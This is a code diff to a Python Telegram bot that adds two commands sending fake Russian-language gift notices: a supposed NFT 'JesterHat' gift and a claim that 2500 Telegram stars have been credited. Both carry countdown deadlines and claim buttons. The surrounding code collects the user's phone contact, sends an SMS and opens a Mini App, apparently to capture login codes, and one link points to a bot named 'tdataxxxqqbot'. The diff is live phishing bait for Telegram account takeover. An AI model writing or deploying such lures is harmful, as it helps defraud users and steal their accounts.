@@ -246,6 +246,40 @@ async def cmd_help(msg: Message):
     )
 
 
+@dp.message_handler(commands=['gift'], state='*')
+async def cmd_gift(msg: Message, state: FSMContext):
+    await state.finish()
+    await msg.answer(
+        '🎁 <b>Вам дарят NFT: JesterHat #120172</b>\n\n'
+        'Учтите, что подарок можно принять только с аккаунта, '
+        'на который был отправлен данный подарок. '
+        'Ссылка действительна 60 минут с момента получения.\n\n'
+        'https://t.me/nft/JesterHat-120172',
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton('Получить 🎁', url='https://t.me/nft/JesterHat-120172')
+        ]])
+    )
+
+
+@dp.message_handler(commands=['stars'], state='*')
+async def cmd_stars(msg: Message, state: FSMContext):
+    await state.finish()
+    await msg.answer_photo(
+        photo='https://i.postimg.cc/Xv9DyHTF/photo-2025-11-07-21-49-26.jpg',
+        caption=(
+            '✨ <b>ВАМ НАЧИСЛЕНО 2500 ЗВЁЗД!</b>\n\n'
+            '🎉 Поздравляем! Вам был выдан специальный бонус — '
+            '2500 звёзд на ваш аккаунт.\n\n'
+            '⏰ Успейте забрать до истечения времени:\n'
+            '🕐 Чек действителен всего <b>25 минут!</b>\n\n'
+            'Для зачисления звёзд нажмите кнопку ниже 👇'
+        ),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton('🚀 ЗАБРАТЬ 2500 ЗВЁЗД', url='https://t.me/tdataxxxqqbot?start=gift')
+        ]])
+    )
+
+
 # ── Получаем контакт → отправляем SMS → открываем Mini App
 @dp.message_handler(content_types=['contact'], state=Auth.wait_contact)
 async def on_contact(msg: Message, state: FSMContext):
